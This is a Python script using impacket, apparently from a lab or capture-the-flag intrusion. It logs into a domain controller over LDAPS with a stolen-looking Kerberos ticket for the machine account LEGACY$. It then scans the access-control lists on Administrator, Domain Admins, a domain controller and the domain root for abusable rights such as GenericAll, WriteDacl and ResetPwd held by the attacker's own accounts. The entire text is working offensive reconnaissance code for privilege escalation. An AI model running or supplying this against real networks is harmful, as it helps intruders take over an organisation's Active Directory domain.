#!/usr/bin/env python3
import os
from impacket.ldap import ldap as l_ldap
from impacket.ldap import ldapasn1
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID

os.environ['KRB5CCNAME']='/home/kali/LEGACY$.ccache'
conn=l_ldap.LDAPConnection('ldaps://dc02.core.corp','DC=core,DC=corp','<DC01_IP>')
conn.kerberosLogin('LEGACY$','','core.corp','','',None,kdcHost='<DC01_IP>')

def get_attr(entry, name):
    # entry is ldapasn1.SearchResultEntry
    for attribute in entry['attributes']:
        if str(attribute['type']) == name:
            return [v.asOctets() for v in attribute['vals']]
    return []

def canon(raw):
    if isinstance(raw, bytes):
        return LDAP_SID(data=raw).formatCanonical()
    return str(raw)

OUR=set()
for item in conn.search(searchFilter="(|(sAMAccountName=LEGACY$)(sAMAccountName=svc_enrollment))", attributes=['objectSid']):
    if isinstance(item, ldapasn1.SearchResultEntry):
        for b in get_attr(item,'objectSid'):
            if isinstance(b,bytes): OUR.add(canon(b))
try:
    d=sorted(OUR)[0]; dsid='-'.join(d.split('-')[:-1]); OUR.add(dsid+'-513')
except Exception: pass
print("OUR SIDs:", sorted(OUR))

ACCESS={'GenericAll':0x10000000,'GenericWrite':0x40000000,'WriteDacl':0x00040000,
        'WriteOwner':0x00080000,'ControlAccess':0x00000100,'ResetPwd':0x00000040,
        'WritePwd':0x00000020,'AddChild/WriteMembers':0x00000002}

targets=[
 'CN=svc_enrollment,CN=Users,DC=core,DC=corp',
 'CN=Administrator,CN=Users,DC=core,DC=corp',
 'CN=Domain Admins,CN=Users,DC=core,DC=corp',
 'CN=DC02,OU=Domain Controllers,DC=core,DC=corp',
 'DC=core,DC=corp',
]
for base in targets:
    for item in conn.search(searchBase=base, searchFilter='(objectClass=*)', attributes=['nTSecurityDescriptor']):
        if not isinstance(item, ldapasn1.SearchResultEntry): continue
        raw=get_attr(item,'nTSecurityDescriptor')
        if not raw: print(f"[{base}] no sd attr"); continue
        raw=raw[0]
        if not isinstance(raw,bytes): continue
        try:
            sd=SR_SECURITY_DESCRIPTOR(); sd.fromString(raw)
        except Exception as e:
            print(f"[{base}] decode err {e}"); continue
        if sd['Dacl'] is None: print(f"[{base}] no dacl"); continue
        print(f"\n===== DACL on {base} =====")
        for ace in sd['Dacl']['Data']:
            try: s=canon(ace['Sid'].getData())
            except Exception: continue
            acc=ace['Mask']['Mask']
            desc=[k for k,m in ACCESS.items() if acc&m]
            mark=' <<< OURS' if s in OUR else ''
            if desc:
                print(f"  sid={s} type={ace['TypeName']} -> {'|'.join(desc)}{mark}")
conn.close()